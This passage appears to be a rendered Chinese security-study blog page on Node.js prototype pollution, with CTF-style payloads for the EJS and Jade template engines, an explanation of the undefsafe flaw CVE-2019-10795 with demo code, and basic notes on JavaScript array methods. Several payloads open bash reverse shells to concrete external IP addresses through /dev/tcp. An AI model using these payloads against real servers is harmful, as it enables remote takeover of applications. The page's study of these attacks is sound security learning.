+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://www.bilibili.com/read/cv20929156"target="_blank" rel="external nofollow noopener noreferrer">https://www.bilibili.com/read/cv20929156</a></p>
+<p>EJS 是一套简单的模板语言，设计的初衷是用尽可能少的js代码，渲染出丰富的html页面。</p>
+<p>poc</p>
+<pre tabindex="0"><code>{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;console.log(123);var __tmp2&#34;}}}
+
+{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/8.130.69.158/7788 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;}}}</code></pre><h6 id="jade" class="heading-element"><span>0.0.0.4.2  JADE</span>
+  <a href="#jade" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://xz.aliyun.com/t/7025#toc-2"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/7025#toc-2</a></p>
+<p><a href="https://tari.moe/p/2021/ctfshow-nodejs#c869ae41c9ab4f08948195242a67266e"target="_blank" rel="external nofollow noopener noreferrer">https://tari.moe/p/2021/ctfshow-nodejs#c869ae41c9ab4f08948195242a67266e</a></p>
+<p>ctfshow342</p>
+<p>常见 Express 模板引擎有(包括但不限于如下)：</p>
+<ul>
+<li>jade</li>
+<li>pug</li>
+<li>ejs</li>
+<li>dust.js</li>
+<li>nunjunks</li>
+</ul>
+<pre tabindex="0"><code>{&#34;__proto__&#34;:{&#34;compileDebug&#34;:1,&#34;self&#34;:1,&#34;line&#34;:&#34;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&#34;&#39;))&#34;}}
+
+
+{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;compileDebug&#34;:1,&#34;type&#34;:&#34;Code&#34;,&#34;self&#34;:1,&#34;line&#34;:&#34;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/119.28.15.55/2233 0&gt;&amp;1\&#34;&#39;)&#34;}}}
+
+
+{&#34;__proto__&#34;:{&#34;self&#34;:&#34;true&#34;,&#34;line&#34;:&#34;2,jade_debug[0].filename));return global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;)//&#34;}}
+
+{&#34;__proto__&#34;:{&#34;self&#34;:1,&#34;line&#34;:&#34;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;)&#34;}}</code></pre><h6 id="undefsafe-模块原型链污染cve-2019-10795" class="heading-element"><span>0.0.0.4.3  Undefsafe 模块原型链污染（CVE-2019-10795）</span>
+  <a href="#undefsafe-%e6%a8%a1%e5%9d%97%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93cve-2019-10795" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">object</span> <span style="color:#ff636f">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">a</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">b</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">c</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">d</span><span style="color:#ff636f">:</span> [<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span>],
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>.<span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">b</span>.<span style="color:#58a1dd">e</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>.<span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">c</span>.<span style="color:#58a1dd">e</span>)</span></span></code></pre></div><p>可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292212490.webp" alt="image-20230729221238222" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292212490.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292212490.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292212490.webp?size=large 2x" data-title="image-20230729221238222" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>undefsafe可以帮我们解决这个问题</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">undef</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;undefsafe&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">object</span> <span style="color:#ff636f">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">a</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">b</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">c</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">d</span><span style="color:#ff636f">:</span> [<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span>],
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">undef</span>(<span style="color:#58a1dd">object</span>,<span style="color:#a6be9d">&#39;a.b.e&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>.<span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">b</span>.<span style="color:#58a1dd">e</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">undef</span>(<span style="color:#58a1dd">object</span>,<span style="color:#a6be9d">&#39;a.c.e&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>.<span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">c</span>.<span style="color:#58a1dd">e</span>)</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292219205.webp" alt="image-20230729221956930" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292219205.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292219205.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292219205.webp?size=large 2x" data-title="image-20230729221956930" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>它还有一个功能：在对对象赋值时，如果目标属性存在，其可以帮助我们==修改对应属性的值==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">undef</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;undefsafe&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">object</span> <span style="color:#ff636f">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">a</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">b</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">c</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">d</span><span style="color:#ff636f">:</span> [<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span>],
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">undef</span>(<span style="color:#58a1dd">object</span>, <span style="color:#a6be9d">&#39;a.b.e&#39;</span> , <span style="color:#a6be9d">&#39;123&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>)</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292226692.webp" alt="image-20230729222634464" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292226692.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292226692.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292226692.webp?size=large 2x" data-title="image-20230729222634464" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>当属性不存在的时候 我们可以==对属性赋值==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">undef</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;undefsafe&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">object</span> <span style="color:#ff636f">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">a</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">b</span><span style="color:#ff636f">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">c</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">d</span><span style="color:#ff636f">:</span> [<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span>],
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">undef</span>(<span style="color:#58a1dd">object</span>, <span style="color:#a6be9d">&#39;a.f.e&#39;</span> , <span style="color:#a6be9d">&#39;123&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object</span>)</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292231178.webp" alt="image-20230729223142939" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292231178.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292231178.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292231178.webp?size=large 2x" data-title="image-20230729223142939" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个需要下载 undefsafe小于2.0.3的版本</p>
+<p>我们可以发现 当我们可以控制undefsafe函数的第2 3 个参数的时候 我们可以污染 object中的值</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;undefsafe&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">test</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">a</span>(<span style="color:#58a1dd">test</span>,<span style="color:#a6be9d">&#39;__proto__.toString&#39;</span>,<span style="color:#ff636f">function</span>(){ <span style="color:#ff636f">return</span> <span style="color:#a6be9d">&#39;just a evil!&#39;</span>})
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#39;this is &#39;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">test</span>)</span></span></code></pre></div><p>我们可以看到 上面成功的进行了原型链污染</p>
+<p>因为 在在上面 污染了toString 因为在当前对象中找不到 于是 需要向上溯源</p>
+<p>最后在进行this is 和 test拼接的时候 触发了tostring 造成了原型链污染</p>
+<p>在2.0.3后的版本 加上了下面的限制</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp" alt="image-20230729222823558" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp?size=large 2x" data-title="image-20230729222823558" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>应该是 对于其修改Object中本身的属性 做出了限制 所以 不能进行污染了</p>
+<h6 id="审计" class="heading-element"><span>0.0.0.4.4  审计</span>
+  <a href="#%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### split()</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">splitStr</span>(<span style="color:#58a1dd">str</span>, <span style="color:#58a1dd">separator</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// Function to split string
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#ff636f">var</span> <span style="color:#58a1dd">string</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">str</span>.<span style="color:#58a1dd">split</span>(<span style="color:#58a1dd">separator</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">string</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// Initialize string
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">str</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;GeeksforGeeks/A/computer/science/portal&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">separator</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;/&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// Function call
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">splitStr</span>(<span style="color:#58a1dd">str</span>, <span style="color:#58a1dd">separator</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Output</span><span style="color:#ff636f">:</span>
+</span></span><span style="display:flex;"><span>[ <span style="color:#a6be9d">&#39;GeeksforGeeks&#39;</span>, <span style="color:#a6be9d">&#39;A&#39;</span>, <span style="color:#a6be9d">&#39;computer&#39;</span>, <span style="color:#a6be9d">&#39;science&#39;</span>, <span style="color:#a6be9d">&#39;portal&#39;</span> ]</span></span></code></pre></div><p>####### Array.prototype.filter()</p>
+<p><strong><code>filter()</code></strong> 方法會建立一個經指定之函式運算後，由原陣列中通過該函式檢驗之元素所構成的新陣列。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">words</span> <span style="color:#ff636f">=</span> [<span style="color:#a6be9d">&#39;spray&#39;</span>, <span style="color:#a6be9d">&#39;limit&#39;</span>, <span style="color:#a6be9d">&#39;elite&#39;</span>, <span style="color:#a6be9d">&#39;exuberant&#39;</span>, <span style="color:#a6be9d">&#39;destruction&#39;</span>, <span style="color:#a6be9d">&#39;present&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">result</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">words</span>.<span style="color:#58a1dd">filter</span>(<span style="color:#58a1dd">word</span> =&gt; <span style="color:#58a1dd">word</span>.<span style="color:#58a1dd">length</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">6</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">result</span>);
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;exuberant&#34;, &#34;destruction&#34;, &#34;present&#34;]
+</span></span></span></code></pre></div><p>相当于一个 过滤器</p>
+<p>####### Array.prototype.slice()</p>
+<p><strong><code>slice()</code></strong> 方法會回傳一個新陣列物件，為原陣列選擇之 <code>begin</code> 至 <code>end</code>（不含 <code>end</code>）部分的淺拷貝（shallow copy）。而原本的陣列將不會被修改。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">animals</span> <span style="color:#ff636f">=</span> [<span style="color:#a6be9d">&#39;ant&#39;</span>, <span style="color:#a6be9d">&#39;bison&#39;</span>, <span style="color:#a6be9d">&#39;camel&#39;</span>, <span style="color:#a6be9d">&#39;duck&#39;</span>, <span style="color:#a6be9d">&#39;elephant&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>(<span style="color:#a6be9d">2</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;camel&#34;, &#34;duck&#34;, &#34;elephant&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>(<span style="color:#a6be9d">2</span>, <span style="color:#a6be9d">4</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;camel&#34;, &#34;duck&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>(<span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">5</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;bison&#34;, &#34;camel&#34;, &#34;duck&#34;, &#34;elephant&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>(<span style="color:#ff636f">-</span><span style="color:#a6be9d">2</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;duck&#34;, &#34;elephant&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>(<span style="color:#a6be9d">2</span>, <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;camel&#34;, &#34;duck&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>());
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;ant&#34;, &#34;bison&#34;, &#34;camel&#34;, &#34;duck&#34;, &#34;elephant&#34;]
+</span></span></span></code></pre></div><p>这是相当于一个数组切割的工具</p>
+<p>####### Array.prototype.join()</p>
+<p>join() 方法會將陣列（或一個類陣列（array-like）物件）中所有的元素連接、合併成一個字串，並回傳此字串。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">elements</span> <span style="color:#ff636f">=</span> [<span style="color:#a6be9d">&#39;Fire&#39;</span>, <span style="color:#a6be9d">&#39;Air&#39;</span>, <span style="color:#a6be9d">&#39;Water&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">elements</span>.<span style="color:#58a1dd">join</span>());
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: &#34;Fire,Air,Water&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">elements</span>.<span style="color:#58a1dd">join</span>(<span style="color:#a6be9d">&#39;&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: &#34;FireAirWater&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
